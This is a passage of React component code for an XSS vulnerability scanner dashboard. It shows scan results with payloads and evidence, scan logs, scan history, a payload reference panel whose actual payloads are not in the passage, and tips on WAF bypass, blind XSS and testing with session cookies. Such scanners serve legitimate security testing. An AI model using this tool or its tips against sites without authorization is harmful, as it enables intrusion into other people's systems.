                          <p className="text-sm text-slate-300 mb-1">
                            Parameter: <span className="text-white font-mono">{result.parameter}</span>
                          </p>
                          <div className="flex items-center gap-2">
                            <code className="flex-1 text-xs text-red-400 bg-dark-900 p-2 rounded font-mono break-all">
                              {result.payload}
                            </code>
                            <button
                              onClick={() => copyPayload(result.payload)}
                              className="p-1.5 text-slate-400 hover:text-white transition-colors"
                              title="Copy payload"
                            >
                              {copiedPayload === result.payload ? (
                                <Check className="w-4 h-4 text-green-400" />
                              ) : (
                                <Copy className="w-4 h-4" />
                              )}
                            </button>
                          </div>
                          {result.evidence && (
                            <div className="mt-2">
                              <p className="text-xs text-slate-500 mb-1">Evidence:</p>
                              <code className="block text-xs text-slate-400 bg-dark-900 p-2 rounded font-mono break-all">
                                {result.evidence}
                              </code>
                            </div>
                          )}
                        </div>
                        <a
                          href={result.url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="p-2 text-slate-400 hover:text-white transition-colors"
                          title="Open URL"
                        >
                          <ExternalLink className="w-4 h-4" />
                        </a>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-12">
                  <Shield className="w-12 h-12 text-slate-600 mx-auto mb-4" />
                  <p className="text-slate-400">No XSS vulnerabilities found</p>
                </div>
              )}

              {/* Error Display */}
              {selectedScan.error && (
                <div className="mt-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
                  <p className="text-sm text-red-400">{selectedScan.error}</p>
                </div>
              )}

              {/* Logs for completed scans */}
              {selectedScan.status !== 'running' && selectedScan.logs && selectedScan.logs.length > 0 && (
                <div className="mt-4 border-t border-dark-700 pt-4">
                  <details className="group">
                    <summary className="text-sm font-medium text-slate-400 cursor-pointer hover:text-white flex items-center gap-2">
                      <Code className="w-4 h-4" />
                      View Scan Logs ({selectedScan.logs.length} entries)
                      <ChevronRight className="w-4 h-4 group-open:rotate-90 transition-transform" />
                    </summary>
                    <div className="mt-2 bg-dark-900 rounded-lg p-3 max-h-[200px] overflow-y-auto font-mono text-xs space-y-1">
                      {selectedScan.logs.map((log, index) => (
                        <div key={index} className="flex items-start gap-2">
                          <span className="text-slate-600 shrink-0">
                            {new Date(log.timestamp).toLocaleTimeString()}
                          </span>
                          <span className={cn(
                            'shrink-0 uppercase w-12',
                            log.level === 'success' && 'text-green-400',
                            log.level === 'info' && 'text-blue-400',
                            log.level === 'warn' && 'text-yellow-400',
                            log.level === 'error' && 'text-red-400',
                          )}>
                            [{log.level}]
                          </span>
                          <span className="text-slate-300">{log.message}</span>
                        </div>
                      ))}
                    </div>
                  </details>
                </div>
              )}
            </motion.div>
          ) : null}
        </div>

        {/* Right Panel - Scan History & Payloads */}
        <div className="lg:col-span-1 space-y-4">
          {/* Recent Scans */}
          <div className="p-4 bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800">
            <h3 className="text-sm font-medium text-white mb-3">Recent Scans</h3>
            {!mounted || loading ? (
              <div className="flex items-center justify-center py-8">
                <Loader2 className="w-6 h-6 text-red-400 animate-spin" />
              </div>
            ) : scans.length === 0 ? (
              <div className="text-center py-8">
                <Shield className="w-8 h-8 text-slate-600 mx-auto mb-2" />
                <p className="text-sm text-slate-400">No scans yet</p>
              </div>
            ) : (
              <div className="space-y-2 max-h-[300px] overflow-y-auto">
                {scans.slice(0, 10).map((scan) => {
                  const status = statusConfig[scan.status] || statusConfig.pending;
                  const StatusIcon = status.icon;
                  const isSelected = selectedScan?._id === scan._id;

                  return (
                    <button
                      key={scan._id}
                      onClick={() => handleViewScan(scan)}
                      className={cn(
                        'w-full text-left p-3 rounded-lg border transition-colors',
                        isSelected
                          ? 'bg-red-500/20 border-red-500/30'
                          : 'bg-dark-800/50 border-dark-700 hover:border-dark-600'
                      )}
                    >
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1 min-w-0">
                          <p className="text-sm text-white truncate">{scan.url}</p>
                          <p className="text-xs text-slate-500 mt-1">
                            {scan.config.tools.join(', ')}
                          </p>
                        </div>
                        <span className={cn('flex items-center gap-1 px-1.5 py-0.5 rounded text-xs shrink-0', status.bg, status.color)}>
                          <StatusIcon className={cn('w-3 h-3', scan.status === 'running' && 'animate-spin')} />
                        </span>
                      </div>
                      <div className="flex items-center justify-between mt-2">
                        <span className="text-xs text-slate-500">
                          {formatDateTime(scan.createdAt)}
                        </span>
                        <span className={cn(
                          'text-xs',
                          scan.vulnerabilitiesFound > 0 ? 'text-red-400' : 'text-slate-400'
                        )}>
                          {scan.vulnerabilitiesFound || 0} vulns
                        </span>
                      </div>
                    </button>
                  );
                })}
              </div>
            )}
          </div>

          {/* Payload Reference */}
          <div className="p-4 bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800">
            <button
              onClick={() => setShowPayloads(!showPayloads)}
              className="w-full flex items-center justify-between text-sm font-medium text-white"
            >
              <span className="flex items-center gap-2">
                <Code className="w-4 h-4 text-red-400" />
                XSS Payloads Reference
              </span>
              {showPayloads ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
            </button>

            {showPayloads && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="mt-3 space-y-2 max-h-[400px] overflow-y-auto"
              >
                {payloads.map((payload, index) => (
                  <div
                    key={index}
                    className="flex items-center gap-2 p-2 bg-dark-800/50 rounded-lg group"
                  >
                    <code className="flex-1 text-xs text-slate-300 font-mono break-all">
                      {payload}
                    </code>
                    <button
                      onClick={() => copyPayload(payload)}
                      className="p-1 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                      title="Copy"
                    >
                      {copiedPayload === payload ? (
                        <Check className="w-3 h-3 text-green-400" />
                      ) : (
                        <Copy className="w-3 h-3" />
                      )}
                    </button>
                  </div>
                ))}
              </motion.div>
            )}
          </div>

          {/* Quick Tips */}
          <div className="p-4 bg-dark-900/80 backdrop-blur rounded-xl border border-red-500/30">
            <h3 className="text-sm font-medium text-white mb-3 flex items-center gap-2">
              <Zap className="w-4 h-4 text-red-400" />
              Quick Tips
            </h3>
            <ul className="space-y-2 text-xs text-slate-400">
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                Enable WAF Bypass for protected targets
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                Use Blind XSS for stored XSS detection
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                Check different contexts: HTML, JS, URL
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                Install dalfox for advanced scanning
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400">•</span>
                Test with authenticated sessions using cookies
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
